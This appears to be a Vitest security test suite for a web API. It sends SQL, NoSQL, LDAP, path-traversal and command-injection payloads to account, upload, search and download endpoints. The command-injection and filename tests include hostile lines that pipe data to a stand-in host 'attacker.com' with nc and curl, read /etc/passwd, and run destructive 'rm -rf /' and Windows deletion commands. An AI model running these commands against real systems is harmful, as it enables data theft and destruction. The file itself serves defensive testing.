/**
 * Input Validation and SQL Injection Prevention Tests
 * Tests for secure input handling and database query protection
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { unstable_dev } from 'wrangler';
import type { UnstableDevWorker } from 'wrangler';
import { testEnv } from '../setup/test-env';

describe('Input Validation Security Tests', () => {
  let worker: UnstableDevWorker;
  let env: any;
  let authToken: string;

  beforeEach(async () => {
    env = await testEnv();
    worker = await unstable_dev('src/index.ts', {
      experimental: { disableExperimentalWarning: true },
    });

    // Set up authenticated user for tests
    await worker.fetch('/api/accounts/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'validation_test_user',
        password: 'SecurePass123!',
        email: 'validation@test.com'
      })
    });

    const loginResponse = await worker.fetch('/api/accounts/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'validation_test_user',
        password: 'SecurePass123!'
      })
    });

    const { access_token } = await loginResponse.json();
    authToken = access_token;
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in user registration', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "admin'--",
        "' OR 'a'='a",
        "'; EXEC xp_cmdshell('format c:') --",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await worker.fetch('/api/accounts/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: payload,
            password: 'SecurePass123!',
            email: 'sql@test.com'
          })
        });

        // Should either reject invalid input or handle it safely
        expect(response.status).toBeOneOf([400, 422]);
        const body = await response.json();
        expect(body.error).toBeDefined();
      }
    });

    it('should prevent SQL injection in login attempts', async () => {
      const sqlInjectionPayloads = [
        "admin' --",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1#",
        "' OR 'a'='a",
        "'; EXEC xp_cmdshell('dir') --",
        "' UNION SELECT 1,2,3,4,5 --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await worker.fetch('/api/accounts/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: payload,
            password: 'anypassword'
          })
        });

        // Should return 401 Unauthorized, not 200 OK
        expect(response.status).toBe(401);
      }
    });

    it('should prevent SQL injection in file search', async () => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE files; --",
        "' UNION SELECT * FROM files --",
        "' OR EXISTS(SELECT * FROM files) --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await worker.fetch(`/api/list_cutter/files/search?query=${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        // Should handle search safely
        expect(response.status).toBeOneOf([200, 400]);
        
        if (response.status === 200) {
          const body = await response.json();
          // Should return normal search results, not database structure
          expect(body.files).toBeDefined();
          expect(Array.isArray(body.files)).toBe(true);
        }
      }
    });

    it('should prevent SQL injection in CSV filter queries', async () => {
      // Upload a test CSV first
      const csvContent = 'name,age,city\nJohn,25,NYC\nJane,30,LA';
      const formData = new FormData();
      formData.append('file', new Blob([csvContent], { type: 'text/csv' }), 'test.csv');

      const uploadResponse = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      const { file_id } = await uploadResponse.json();

      const sqlInjectionPayloads = [
        "name = 'John' OR '1'='1'",
        "name = 'John'; DROP TABLE csv_data; --",
        "name = 'John' UNION SELECT * FROM users --",
        "name = 'John' OR EXISTS(SELECT * FROM files) --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await worker.fetch('/api/list_cutter/filter', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            file_id,
            filter: payload
          })
        });

        // Should either reject invalid filter or handle it safely
        expect(response.status).toBeOneOf([200, 400]);
        
        if (response.status === 200) {
          const body = await response.json();
          // Should return valid CSV data, not database structure
          expect(body.data).toBeDefined();
          expect(Array.isArray(body.data)).toBe(true);
        }
      }
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize file upload names', async () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file.csv; rm -rf /',
        'file.csv && cat /etc/passwd',
        'file.csv | nc attacker.com 80',
        'file.csv`whoami`',
        'file.csv$(whoami)',
        'file.csv\x00.exe',
        'file.csv\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>'
      ];

      for (const filename of maliciousFilenames) {
        const csvContent = 'name,age\nJohn,25';
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), filename);

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        if (response.status === 200) {
          const body = await response.json();
          // Filename should be sanitized
          expect(body.filename).not.toContain('../');
          expect(body.filename).not.toContain('..\\');
          expect(body.filename).not.toContain(';');
          expect(body.filename).not.toContain('&');
          expect(body.filename).not.toContain('|');
          expect(body.filename).not.toContain('`');
          expect(body.filename).not.toContain('$');
          expect(body.filename).not.toContain('\x00');
          expect(body.filename).not.toContain('\r');
          expect(body.filename).not.toContain('\n');
        }
      }
    });

    it('should validate email addresses', async () => {
      const invalidEmails = [
        'invalid-email',
        'user@',
        '@domain.com',
        'user..name@domain.com',
        'user@domain',
        'user@.com',
        'user@domain..com',
        'user@domain.com.',
        'user name@domain.com',
        'user@domain@com',
        'user@domain,com',
        'user@domain;com',
        'user@domain com',
        'user@domain.c',
        'user@domain.commmmm',
        'user@192.168.1.1.1',
        'user@[192.168.1.1.1]',
        'user@localhost',
        'user@127.0.0.1',
        'user@0.0.0.0',
        'user@256.256.256.256'
      ];

      for (const email of invalidEmails) {
        const response = await worker.fetch('/api/accounts/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: `user_${Date.now()}`,
            password: 'SecurePass123!',
            email
          })
        });

        expect(response.status).toBe(400);
        const body = await response.json();
        expect(body.error).toContain('email');
      }
    });

    it('should validate username format', async () => {
      const invalidUsernames = [
        '',
        'a',
        'ab',
        'user name',
        'user@name',
        'user#name',
        'user$name',
        'user%name',
        'user&name',
        'user*name',
        'user+name',
        'user=name',
        'user?name',
        'user^name',
        'user`name',
        'user{name',
        'user|name',
        'user}name',
        'user~name',
        'user[name',
        'user]name',
        'user(name)',
        'user<name>',
        'user"name',
        "user'name",
        'user\\name',
        'user/name',
        'user:name',
        'user;name',
        'user,name',
        'user.name.',
        '.username',
        'username.',
        'user..name',
        'a'.repeat(51), // Too long
        'admin',
        'root',
        'administrator',
        'system',
        'user',
        'test',
        'guest',
        'public',
        'www',
        'ftp',
        'mail',
        'email',
        'null',
        'undefined',
        'api',
        'app',
        'web',
        'site',
        'blog',
        'forum'
      ];

      for (const username of invalidUsernames) {
        const response = await worker.fetch('/api/accounts/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username,
            password: 'SecurePass123!',
            email: 'valid@email.com'
          })
        });

        expect(response.status).toBe(400);
        const body = await response.json();
        expect(body.error).toBeDefined();
      }
    });

    it('should validate CSV column names', async () => {
      const maliciousColumnNames = [
        'name,age,__proto__',
        'name,age,constructor',
        'name,age,prototype',
        'name,age,toString',
        'name,age,valueOf',
        'name,age,hasOwnProperty',
        'name,age,isPrototypeOf',
        'name,age,propertyIsEnumerable',
        'name,age,toLocaleString',
        'name,age,__defineGetter__',
        'name,age,__defineSetter__',
        'name,age,__lookupGetter__',
        'name,age,__lookupSetter__',
        'name,age,<script>',
        'name,age,javascript:',
        'name,age,data:',
        'name,age,eval(',
        'name,age,Function(',
        'name,age,onclick',
        'name,age,onload',
        'name,age,onerror'
      ];

      for (const columnHeader of maliciousColumnNames) {
        const csvContent = `${columnHeader}\nJohn,25,value`;
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), 'test.csv');

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        if (response.status === 200) {
          const body = await response.json();
          // Should reject or sanitize dangerous column names
          expect(body.columns).toBeDefined();
          expect(body.columns).not.toContain('__proto__');
          expect(body.columns).not.toContain('constructor');
          expect(body.columns).not.toContain('<script>');
          expect(body.columns).not.toContain('javascript:');
          expect(body.columns).not.toContain('eval(');
        }
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection in JSON payloads', async () => {
      const noSQLInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'function() { return true; }' },
        { $expr: { $eq: [1, 1] } },
        { $or: [{ username: 'admin' }, { username: 'root' }] },
        { $and: [{ $ne: null }, { $gt: '' }] },
        { $not: { $eq: null } },
        { $in: ['admin', 'root', 'administrator'] },
        { $nin: [] },
        { $all: [] },
        { $elemMatch: { $eq: 'admin' } },
        { $size: 0 },
        { $mod: [2, 0] },
        { $type: 'string' },
        { $exists: true },
        { $jsonSchema: {} },
        { $text: { $search: 'admin' } },
        { $comment: 'injection attempt' }
      ];

      for (const payload of noSQLInjectionPayloads) {
        const response = await worker.fetch('/api/accounts/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: payload,
            password: 'anypassword'
          })
        });

        expect(response.status).toBe(401);
      }
    });

    it('should prevent NoSQL injection in search queries', async () => {
      const noSQLInjectionQueries = [
        '{"$ne":null}',
        '{"$gt":""}',
        '{"$regex":".*"}',
        '{"$where":"function(){return true;}"}',
        '{"$or":[{"name":"admin"},{"name":"root"}]}',
        '{"$and":[{"$ne":null},{"$gt":""}]}',
        '{"$not":{"$eq":null}}',
        '{"$in":["admin","root"]}',
        '{"$exists":true}',
        '{"$type":"string"}'
      ];

      for (const query of noSQLInjectionQueries) {
        const response = await worker.fetch(`/api/list_cutter/files/search?query=${encodeURIComponent(query)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        expect(response.status).toBeOneOf([200, 400]);
        
        if (response.status === 200) {
          const body = await response.json();
          expect(body.files).toBeDefined();
          expect(Array.isArray(body.files)).toBe(true);
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent path traversal in file operations', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '....\\\\....\\\\....\\\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cconfig%c1%9csam'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await worker.fetch(`/api/list_cutter/files/${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        expect(response.status).toBeOneOf([400, 404]);
      }
    });

    it('should prevent path traversal in file downloads', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await worker.fetch(`/api/list_cutter/download/${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        expect(response.status).toBeOneOf([400, 404]);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in file processing', async () => {
      const commandInjectionPayloads = [
        'file.csv; rm -rf /',
        'file.csv && cat /etc/passwd',
        'file.csv | nc attacker.com 80',
        'file.csv`whoami`',
        'file.csv$(whoami)',
        'file.csv; curl attacker.com/steal?data=$(cat /etc/passwd)',
        'file.csv; python -c "import os; os.system(\'rm -rf /\')"',
        'file.csv; node -e "require(\'child_process\').exec(\'rm -rf /\')"',
        'file.csv; powershell -c "Remove-Item -Recurse -Force C:\\"',
        'file.csv; cmd /c "del /f /s /q C:\\"',
        'file.csv; bash -c "rm -rf /"',
        'file.csv; sh -c "rm -rf /"'
      ];

      for (const payload of commandInjectionPayloads) {
        const csvContent = 'name,age\nJohn,25';
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), payload);

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        // Should handle dangerous filenames safely
        if (response.status === 200) {
          const body = await response.json();
          expect(body.filename).not.toContain(';');
          expect(body.filename).not.toContain('&');
          expect(body.filename).not.toContain('|');
          expect(body.filename).not.toContain('`');
          expect(body.filename).not.toContain('$');
          expect(body.filename).not.toContain('rm');
          expect(body.filename).not.toContain('cat');
          expect(body.filename).not.toContain('curl');
          expect(body.filename).not.toContain('python');
          expect(body.filename).not.toContain('node');
          expect(body.filename).not.toContain('powershell');
          expect(body.filename).not.toContain('cmd');
          expect(body.filename).not.toContain('bash');
          expect(body.filename).not.toContain('sh');
        }
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection in search queries', async () => {
      const ldapInjectionPayloads = [
        'admin)(|(password=*))',
        'admin)(|(objectclass=*))',
        'admin)(|(cn=*))',
        'admin)(|(uid=*))',
        'admin)(|(mail=*))',
        'admin)(&(objectclass=user)(password=*))',
        'admin)(&(objectclass=person)(cn=*))',
        '*)(uid=*',
        '*)(objectclass=*',
        '*)(cn=*',
        '*)(password=*',
        '*)(|(uid=*)(password=*)',
        '*)(|(objectclass=*)(cn=*)',
        '*)(|(mail=*)(password=*)'
      ];

      for (const payload of ldapInjectionPayloads) {
        const response = await worker.fetch(`/api/list_cutter/files/search?query=${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        expect(response.status).toBeOneOf([200, 400]);
        
        if (response.status === 200) {
          const body = await response.json();
          expect(body.files).toBeDefined();
          expect(Array.isArray(body.files)).toBe(true);
        }
      }
    });
  });

  afterEach(async () => {
    await worker.stop();
  });
});